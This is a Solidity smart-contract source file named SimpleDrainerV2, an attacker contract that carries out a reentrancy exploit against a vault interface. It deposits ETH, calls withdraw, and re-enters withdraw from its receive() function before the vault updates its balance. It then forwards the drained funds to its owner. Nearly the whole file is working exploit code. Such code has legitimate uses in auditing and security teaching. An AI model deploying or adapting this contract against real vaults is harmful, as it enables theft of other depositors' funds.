// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
    function getBalance() external view returns (uint256);
}

contract SimpleDrainerV2 {
    IVault public target;
    address public owner;
    uint256 public drainCount;
    bool public attacking;
    uint256 public drainAmountValue;
    
    constructor(address payable _target) {
        target = IVault(_target);
        owner = msg.sender;
    }
    
    function attack(uint256 _drainAmount) external payable {
        require(msg.sender == owner, "Not owner");
        require(msg.value > 0, "Need ETH");
        
        attacking = true;
        drainCount = 0;
        drainAmountValue = _drainAmount;
        
        // Deposit to get balance
        target.deposit{value: msg.value}();
        
        // Start withdrawal - this will trigger receive()
        target.withdraw(_drainAmount);
        
        attacking = false;
    }
    
    receive() external payable {
        // Re-enter with safety checks
        if (attacking && drainCount < 3) {
            uint256 vaultBal = target.getBalance();
            uint256 myBal = target.balanceOf(address(this));
            
            if (vaultBal > 0 && myBal > 0) {
                drainCount++;
                // Try to withdraw again - state hasn't been updated yet!
                uint256 amount = drainAmountValue > myBal ? myBal : drainAmountValue;
                target.withdraw(amount);
            }
        }
    }
    
    function withdrawToOwner() external {
        require(msg.sender == owner, "Not owner");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
